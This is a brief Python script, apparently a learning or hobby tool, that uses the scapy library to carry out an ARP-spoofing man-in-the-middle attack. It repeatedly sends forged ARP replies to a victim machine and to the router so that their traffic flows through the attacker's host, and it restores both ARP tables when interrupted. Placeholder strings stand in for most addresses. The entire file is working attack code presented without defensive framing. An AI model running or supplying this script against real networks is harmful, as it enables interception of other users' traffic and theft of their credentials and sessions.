from scapy.all import *
import time

def spoof_victim():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "Target Ip Address"
    arp_response.hwdst = "target Mac address"
    arp_response.hwsrc = "attacker mac address"

    arp_response.psrc = "xxx.xxx.xxx.2"
    send(arp_response)

def spoof_router():
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "xxx.xxx.xxx.2"
    arp_response.hwdst = "router mac address"
    arp_response.hwsrc = "Attacker mac address"

    arp_response.psrc = "target ip address"
    send(arp_response)


def restore():

    # restoring router table
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "xxx.xxx.xxx.2"
    arp_response.hwdst = "Router mac address"
    arp_response.hwsrc = "Target mac Address"
    arp_response.psrc = "192.168.74.129"
    send(arp_response)


    #restoring windows table
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.74.129"
    arp_response.hwdst = "Target Mac Address"
    arp_response.hwsrc = "Router mac address"
    arp_response.psrc = "xxx.xxx.xxx.2"
    send(arp_response)




if __name__ == "__main__":
    try:
        while True:
            spoof_victim()
            spoof_router()
            time.sleep(2)
    except KeyboardInterrupt as err:
        print("restoring ARP")
        restore()
        print("exiting") 
